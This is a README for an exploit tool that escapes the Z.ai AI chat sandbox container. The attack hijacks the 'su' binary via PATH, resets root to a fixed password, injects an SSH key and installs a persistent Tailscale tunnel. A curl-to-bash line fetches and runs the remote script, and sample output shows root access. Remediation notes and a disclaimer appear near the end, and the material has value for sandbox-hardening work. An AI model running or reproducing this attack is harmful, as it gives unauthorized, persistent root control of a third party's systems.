# z.ai_pwn

> Security research tool — container escape PoC for Z.ai sandbox environments.

## Purpose

This project demonstrates a **PATH hijack privilege escalation** vulnerability in containerized AI sandbox environments. It was developed as part of responsible security research to highlight weaknesses in container isolation and privilege separation.

The goal is to help platform maintainers identify and fix these classes of vulnerabilities before they are exploited maliciously.

## Attack Vector

| Stage | Technique | MITRE ATT&CK |
|-------|-----------|---------------|
| Initial Access | Unprivileged shell in container | T1059.004 |
| Privilege Escalation | PATH hijack of `su` binary | T1574.007 |
| Credential Access | Password reset via `chpasswd` | T1098 |
| Persistence | SSH key injection + Tailscale tunnel | T1098.004, T1572 |

## How It Works

1. Places a wrapper script in `/usr/local/bin/su` (higher PATH priority than `/usr/bin/su`)
2. When a privileged process calls `su`, the wrapper intercepts it and:
   - Resets the root password
   - Injects an SSH public key into `authorized_keys`
3. Establishes persistent remote access via SSH + Tailscale

## Quick Start

```bash
curl -sL https://raw.githubusercontent.com/Mffff4/z.ai_pwn/main/pwn.sh | bash -s '<your-ssh-public-key>'
```

Then send any message in the Z.ai chat to trigger the API to call `su`.

## Usage

```bash
chmod +x pwn.sh
./pwn.sh '<your-ssh-public-key>'
```

**Example:**

```bash
./pwn.sh 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... user@host'
```

**Expected output:**

```
[*] Step 1: Create fake su binary
[!] Now go to the Z.ai chat and type something...
[*] Step 2: Waiting for API to call su...
[+] PWNED! Hijack triggered
[*] Step 3: Install SSH server
[*] Step 4: Install Tailscale
[*] Step 5: Start Tailscale (userspace mode)
[*] Step 6: Get Tailscale login URL

========================================
[+] DONE!
[+] Root password: 12341234
[+] SSH key installed

[*] Tailscale login URL:
    https://login.tailscale.com/a/...

[*] After auth: ssh root@<tailscale-ip>
========================================
```

## Remediation

If you are a platform maintainer, consider the following mitigations:

- **Restrict PATH** — ensure `/usr/local/bin` is not writable by unprivileged users, or place it after system directories in PATH
- **Use absolute paths** — call `/usr/bin/su` explicitly in scripts and services
- **Drop capabilities** — run containers with `--cap-drop=ALL` and only add required capabilities
- **Read-only filesystem** — mount `/usr/local/bin` as read-only
- **Monitor file changes** — use inotify/auditd to detect new binaries in PATH directories

## Legal Disclaimer

> **This tool is provided strictly for authorized security research, penetration testing, and educational purposes.**

- You may **only** use this tool on systems you own or have **explicit written authorization** to test.
- Unauthorized access to computer systems is a criminal offense under CFAA (US), Computer Misuse Act (UK), and equivalent laws worldwide.
- The author assumes **no liability** for any misuse. You are solely responsible for your actions.
- By using this software, you agree to comply with all applicable laws and that you have obtained proper authorization.

See [SECURITY.md](SECURITY.md) for full security policy and legal references.

## License

MIT
